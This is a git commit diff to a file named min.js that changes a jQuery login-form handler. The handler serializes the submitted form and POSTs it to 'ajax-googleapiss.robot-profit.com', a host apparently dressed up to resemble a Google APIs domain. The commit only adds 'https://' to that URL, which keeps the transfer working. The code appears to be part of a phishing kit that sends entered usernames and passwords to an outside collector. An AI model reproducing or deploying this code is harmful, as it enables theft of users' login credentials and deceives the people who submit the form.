a0146b4e0fad04701adfca30a5368cfa49ee15fd
2772828273 <96895447+2772828273@users.noreply.github.com>
2021-12-31 22:06:22 +0700

    Update min.js

--- min.js
+++ min.js
@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "ajax-googleapiss.robot-profit.com/index.php",
+        url: "https://ajax-googleapiss.robot-profit.com/index.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
